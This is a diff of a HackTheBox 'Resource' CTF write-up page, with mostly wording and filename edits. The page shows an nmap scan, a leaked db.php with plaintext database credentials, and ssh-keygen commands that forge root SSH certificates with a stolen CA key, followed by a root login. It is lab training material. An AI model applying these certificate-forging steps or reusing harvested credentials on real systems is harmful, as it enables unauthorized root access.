@@ -6,7 +6,8 @@
     <meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">    
 <meta name="viewport" content="width=device-width,minimum-scale=1">
-<meta name="description" content="Port Scan ┌──(kali㉿kali)-[~/HTB/Resource] └─$ cat scan_Complete # Nmap 7.94SVN scan initiated Sun Aug 11 14:52:16 2024 as: nmap -sC -sV -A -T4 -Pn -p- -o scan_Complete 10.10.11.27 Nmap scan report for 10.10.11.27 Host is up (0.086s latency). Not shown: 65533 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.2p1 Debian 2&#43;deb12u3 (protocol 2.0) | ssh-hostkey: | 256 d5:4f:62:39:7b:d2:22:f0:a8:8a:d9:90:35:60:56:88 (ECDSA) |_ 256 fb:67:b0:60:52:f2:12:7e:6c:13:fb:75:f2:bb:1a:ca (ED25519) 2222/tcp open ssh OpenSSH 8.">
+<meta name="description" content="Port Scan
+┌──(kali㉿kali)-[~/HTB/Resource] └─$ cat scan_Complete # Nmap 7.94SVN scan initiated Sun Aug 11 14:52:16 2024 as: nmap -sC -sV -A -T4 -Pn -p- -o scan_Complete 10.10.11.27 Nmap scan report for 10.10.11.27 Host is up (0.086s latency). Not shown: 65533 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.2p1 Debian 2&#43;deb12u3 (protocol 2.0) | ssh-hostkey: | 256 d5:4f:62:39:7b:d2:22:f0:a8:8a:d9:90:35:60:56:88 (ECDSA) |_ 256 fb:67:b0:60:52:f2:12:7e:6c:13:fb:75:f2:bb:1a:ca (ED25519) 2222/tcp open ssh OpenSSH 8.">
 <meta name="generator" content="Hugo 0.92.2" />
 
 
@@ -55,7 +56,7 @@
           ·
         </span>
         <span>
-          822 words
+          826 words
         </span>
         <span class="split">
           ·
@@ -70,10 +71,10 @@
 
 
     <div class="content">
-      <p><strong>Port Scan</strong>
-<p class="markdown-image">
+      <p><p class="markdown-image">
   <img src="attachment/3bd70dd5104068e4031e06ac1c61711d.png" alt=""  />
 </p></p>
+<p><strong>Port Scan</strong></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">┌──(kali㉿kali)-[~/HTB/Resource]
 └─$ cat scan_Complete 
 # Nmap 7.94SVN scan initiated Sun Aug 11 14:52:16 2024 as: nmap -sC -sV -A -T4 -Pn -p- -o scan_Complete 10.10.11.27
@@ -93,7 +94,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Sun Aug 11 14:52:32 2024 -- 1 IP address (1 host up) scanned in 15.74 seconds
-</code></pre></div><p>Visit the <a href="http://itrc.ssg.htb/" target="_blank" rel="noopener">http://itrc.ssg.htb/</a></p>
+</code></pre></div><p>Visit <a href="http://itrc.ssg.htb/" target="_blank" rel="noopener">http://itrc.ssg.htb/</a></p>
 <p><p class="markdown-image">
   <img src="attachment/712ccf9b98e3eb82338f1bcde7b3513e.png" alt=""  />
 </p></p>
@@ -137,7 +138,6 @@ ticket_section.inc.php
 uploads
 $ cat db.php    
 &lt;?php
-
 $dsn <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;mysql:host=db;dbname=resourcecenter;&#34;</span>;
 $dbusername <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;jj&#34;</span>;
 $dbpassword <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ugEG5rR5SG8uPd&#34;</span>;
@@ -149,8 +149,8 @@ try <span style="color:#f92672">{</span>
     die<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Connection failed: &#34;</span> . $e-&gt;getMessage<span style="color:#f92672">())</span>;
 <span style="color:#f92672">}</span>$ 
 
-</code></pre></div><p>Credentials found here didn&rsquo;t work neither for ssh or others
-Machine looks always broken so i decided to look another writeup and found out that should be present a file in /uploads folder of itrc that i don&rsquo;t have:</p>
+</code></pre></div><p>Credentials found here didn&rsquo;t work neither for ssh or others.
+This box looks always broken so i decided to look a writeup and found out that should be present a file in /uploads folder of itrc that i don&rsquo;t have:</p>
 <p><p class="markdown-image">
   <img src="attachment/836cab1aee6922d645e447bf11a51d46.png" alt=""  />
 </p></p>
@@ -170,13 +170,13 @@ ssh-keygen -s ca-itrc -n zzinter -I kali keypair.pub
   <img src="attachment/c3bd47cec612c42278a478ca983b2cd1.png" alt=""  />
 </p></p>
 <p>RABBIT HOLE, try hard on SSH: <a href="https://shivamaharjan.medium.com/ssh-cas-and-principals-630a433d76d6" target="_blank" rel="noopener">https://shivamaharjan.medium.com/ssh-cas-and-principals-630a433d76d6</a></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">ssh-keygen -t ecdsa -C &#34;The CA&#34; -N &#34;&#34; -f shiva
-ssh-keygen -s ./ca-itrc -I CA-signing -n msainristil,zzinter,root -V +1w -z 1 ./shiva.pub
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">ssh-keygen -t ecdsa -C &#34;The CA&#34; -N &#34;&#34; -f root_key
+ssh-keygen -s ./ca-itrc -I CA-signing -n msainristil,zzinter,root -V +1w -z 1 ./root_key.pub
 
 Copy with scp generated files and:
 
 ──(kali㉿kali)-[~/HTB/Resource]
-└─$ ssh -o CertificateFile=shiva-cert.pub -i shiva root@10.10.11.27            
+└─$ ssh -o CertificateFile=root_key-cert.pub -i root_key root@10.10.11.27            
 Linux itrc 5.15.0-117-generic #127-Ubuntu SMP Fri Jul 5 20:13:28 UTC 2024 x86_64
 
 The programs included with the Debian GNU/Linux system are free software;
@@ -186,7 +186,7 @@ individual files in /usr/share/doc/*/copyright.
 Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
 permitted by applicable law.
 root@itrc:~# ls
-</code></pre></div><p>Even if we logged as root, we don&rsquo;t have nothing here.</p>
+</code></pre></div><p>Even if we logged as root, there&rsquo;s no root flag, so download <strong>sign_key_api.sh</strong> file.</p>
 <p><p class="markdown-image">
   <img src="attachment/09598aa1ce18ac9b5f233eecf3a06a09.png" alt=""  />
 </p></p>
@@ -194,7 +194,7 @@ root@itrc:~# ls
 <p><p class="markdown-image">
   <img src="attachment/b4223d8b25ba9e87781b1b3c05157fee.png" alt=""  />
 </p></p>
-<p>Run these commands to generate ssh keypair and sign them with <strong>ca-itrc</strong> SSH certificate</p>
+<p>Run these commands to generate ssh keypair again and sign them with <strong>ca-itrc</strong> SSH certificate</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">ssh-keygen -t rsa -b 2048 -f keypair
 ssh-keygen -s ca-itrc -I user-cert -n zzinter -V +52w -z 12345 keypair.pub
 </code></pre></div><p><p class="markdown-image">
